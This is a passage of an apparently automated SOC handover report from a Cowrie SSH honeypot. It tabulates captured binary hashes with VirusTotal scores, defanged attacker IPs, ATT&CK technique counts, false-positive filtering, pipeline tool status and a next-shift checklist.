| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **29/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `118.45.101[.]159` | KR | Korea Telecom | **100** ⚠️ | 50 |
| `220.246.46[.]144` | HK | Hong Kong Telecommunications (HKT) Limited Mass Internet | **100** ⚠️ | 41 |
| `130.185.96[.]126` | IL | Pelephone Communications Ltd. | **100** ⚠️ | 50 |
| `119.160.166[.]237` | BN | eSpeed - Broadband DSL | **100** ⚠️ | 50 |
| `196.188.187[.]205` | ET | Ethio Telecom | **100** ⚠️ | 50 |
| `196.190.180[.]19` | ET | Ethio Telecom | **100** ⚠️ | 38 |
| `34.134.187[.]231` | US | Google LLC | **100** ⚠️ | 3 |
| `156.238.86[.]2` | PK | SB Link Network Private Limited | **100** ⚠️ | 38 |
| `185.255.47[.]190` | IQ | Valeen for General trading, Internet Services and Information Technology / Ltd | **100** ⚠️ | 50 |
| `45.59.33[.]109` | US | Altafiber | **100** ⚠️ | 13 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 53 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 30 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 4 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 3 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 3 |

---

## 🔕 False Positive Summary (10 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 2 below threshold 25 | 1 |
| AbuseIPDB score 4 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 8 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 70 cases |
| Tool 34  | Credential Extractor        | ✅ 34 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 3 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 45 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 10 filtered (14.3%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 38 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 21 files |
| Tool 33  | YARA Classifier             | ✅ 7 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 4 priority case(s) shown individually · 35 recon entry/entries in table (3 group(s) consolidating 24 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-02T05:41:39Z_
